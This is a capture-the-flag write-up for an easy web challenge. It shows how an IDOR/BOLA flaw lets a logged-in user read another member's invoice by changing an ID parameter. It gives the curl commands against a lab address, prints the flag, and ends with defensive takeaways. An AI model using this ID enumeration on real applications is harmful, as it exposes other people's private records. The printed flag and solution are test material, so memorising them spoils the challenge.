# 6. Facturación Capybara

**Category**: Web  
**Difficulty**: EASY  
**Points**: 150  

## Description

> El club de capybaras permite a cada socio consultar sus propias facturas... o eso creen. Inicia sesión como capybarito / capybarito123 y consigue ver la factura VIP del Capitán Capybara, que no te pertenece. La bandera está en esa factura.
>
> URL: http://192.99.247.166:8082
>
> **Flag format:** `EVIL{...}`

## Reconnaissance

Login with provided credentials:

```bash
$ curl -s -c cookies.txt -X POST http://192.99.247.166:8082/index.php \
  -d "usuario=capybarito&password=capybarito123"
# 302 redirect to /facturas.php
```

List invoices after login:

```bash
$ curl -s -b cookies.txt http://192.99.247.166:8082/facturas.php
```

Response shows two invoices belonging to the user:
- ID 2: "Suscripción mensual dispensador de pellets" - $49.99
- ID 3: "Sesión de spa y sauna para capybara" - $120.00

Each invoice has a "Ver detalle" link to `/factura.php?id=N`.

## Analysis

The application uses direct object references (IDs) to access invoices. The user sees only their own invoices (IDs 2 and 3), but the ID parameter is not validated for ownership. Testing ID 1:

```bash
$ curl -s -b cookies.txt "http://192.99.247.166:8082/factura.php?id=1"
```

This reveals invoice #1: "Reserva VIP piscina termal de capybaras" for $9,500.00 with the flag in the "Nota interna" field.

This is a classic IDOR (Insecure Direct Object Reference) / BOLA (Broken Object Level Authorization) vulnerability. The application checks authentication but not authorization for the specific resource.

## Exploitation

```bash
# 1. Login
curl -s -c cookies.txt -X POST http://192.99.247.166:8082/index.php \
  -d "usuario=capybarito&password=capybarito123"

# 2. Access unauthorized invoice
curl -s -b cookies.txt "http://192.99.247.166:8082/factura.php?id=1"
```

## Flag

```
EVIL{1d0r_f4ctur4_4jen4}
```

## Key Takeaways

- IDOR vulnerabilities occur when object references (IDs) are exposed without authorization checks
- Always verify that the current user owns or has permission to access the requested resource
- Sequential numeric IDs are especially prone to enumeration attacks
- The flag was stored in an "internal note" field of the VIP invoice

## References

- OWASP IDOR: https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference
- OWASP API Security Top 10 - BOLA: https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/